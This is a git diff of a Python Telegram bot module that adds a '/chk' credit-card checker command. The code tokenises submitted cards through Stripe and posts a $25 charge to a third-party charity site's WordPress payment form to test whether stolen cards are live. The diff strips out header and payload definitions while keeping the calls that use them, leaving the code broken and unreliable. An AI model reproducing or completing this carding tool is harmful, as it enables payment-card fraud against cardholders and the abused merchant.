@@ -1,19 +1,26 @@
 from pyrogram import Client, filters, types
+from pyrogram.errors import *
 import re
 import time
 from DAXXMUSIC import app
+import config
 from config import BOT_USERNAME
 
 
+PREFIX = "/"
+ANTISPAM = 5 
+BLACKLISTED = [] 
+UA = "MR DAXX"
 
-@app.on_message(filters.command('chk'))
-async def ch(message: types.Message):
-    await message.answer_chat_action('typing')
+
+@app.on_message(filters.command("chk", prefixes=PREFIX))
+async def check_cc(client, message):
+    await message.reply_chat_action('typing')
     tic = time.perf_counter()
     ID = message.from_user.id
     FIRST = message.from_user.first_name
     try:
-        await dp.throttle('chk', rate=ANTISPAM)
+        await app.throttle('chk', rate=ANTISPAM)
     except Throttled:
         await message.reply('<b>Too many requests!</b>\n'
                             f'Blocked For {ANTISPAM} seconds')
@@ -41,14 +48,8 @@ async def ch(message: types.Message):
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
 
-        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+        # Add your missing session and other headers here
 
         s = session.post('https://m.stripe.com/6', headers=headers)
         r = s.json()
@@ -68,38 +69,13 @@ async def ch(message: types.Message):
             "card[cvc]": cvv
         }
 
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+        
 
         pr = session.post('https://api.stripe.com/v1/tokens',
                           data=postdata, headers=HEADER)
         Id = pr.json()['id']
 
-        # hmm
-        load = {
-            "action": "wp_full_stripe_payment_charge",
-            "formName": "BanquetPayment",
-            "fullstripe_name": Name,
-            "fullstripe_email": Email,
-            "fullstripe_custom_amount": "25.0",
-            "fullstripe_amount_index": 0,
-            "stripeToken": Id
-        }
-
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "origin": "https://archiro.org",
-            "referer": "https://archiro.org/banquet/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+    
 
         rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                           data=load, headers=header)
